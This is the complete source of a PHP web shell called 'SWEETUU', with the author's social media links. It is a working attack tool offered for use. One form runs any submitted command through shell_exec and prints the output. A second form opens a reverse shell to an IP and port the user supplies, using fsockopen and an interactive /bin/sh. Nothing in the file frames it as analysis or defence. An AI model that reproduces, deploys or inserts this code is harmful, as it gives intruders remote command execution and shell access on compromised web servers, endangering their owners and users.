<?php 
/*
	=======================================================================================
	|	Name   : SWEETUU - Advance Shell by CSPSHIVAM                                 |
	|	Owner  : CSPSHIVAM                                                            |
	|	Social : @iamshivamz                                                          |
	=======================================================================================
*/
?>
<body style="background-color:rgb(255,85,51);">
	<form action="<?php $link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; echo "{$link}"?>" method="POST">
	<center>
		<strong>
		<h1 color="rgb(255, 0, 31)"><b>SWEETUU</b></h1>
		<p1 color="rgb(255, 0, 31)">Advance Shell by <a href="https://www.twitter.com/iamshivamz">CSPSHIVAM</a></p1>
		</br></br></br></br>
		<h2 color="rgb(255, 0, 31)"><b>WEB-SHELL</b></h2>
			COMMAND : <input type="text" name="cmd" value=""/>
			<input type="submit" name="submit" value="RUN" />
		</br></br>
		<p2 color="rgb(255, 255, 255)"><b>=========================================================================================</b></p2>
		<h2 color="rgb(255, 0, 31)"><b>REVERSE SHELL USING PHP</b></h2>
		<p><b><i>*NOTE : </b>Don't forget to start listener</i></p>
		</br>
		IP : <input type="text" name="ip" value=""/>&nbsp;PORT : <input type="text" name="port" value=""/>
		<input type="submit" name="submit" value="GET SHELL" />
		</strong>
	</center>
	<br />
	<strong>
	<font size="5"> 
		<?php
		if(isset($_POST["cmd"])){
			$cmd=$_POST["cmd"];
			$output = shell_exec("{$cmd} 2>&1");
			echo $cmd."</br>"."<pre>".$output."</pre>";
		}
		if (isset($_POST["ip"]) && isset($_POST["port"])) {
			$sock="sock";
			$cmd = "php -r '$"."{$sock}"."=fsockopen("."\"{$_POST["ip"]}\"".","."{$_POST["port"]}".");shell_exec(\""."/bin/sh -i <&3 >&3 2>&3"."\");'";
			if (strlen($cmd)>66) {
				shell_exec("{$cmd} 2>&1");
			}
		}
		?>
		</br></br>
		<p2 color="rgb(255, 255, 255)"><b>--------------------------><a href="https://www.instagram.com/iamshivamz">Instagram</a></b></p2></br></br>
		<p3 color="rgb(255, 255, 255)"><b>--------------------------><a href="https://www.linkedin.com/in/iamshivamz">Linkedin</a></b></p3></br></br>
		<p4 color="rgb(255, 255, 255)"><b>--------------------------><a href="https://www.github.com/cspshivam">Github</a></b></p4>
		</font>
	</strong>
</body>
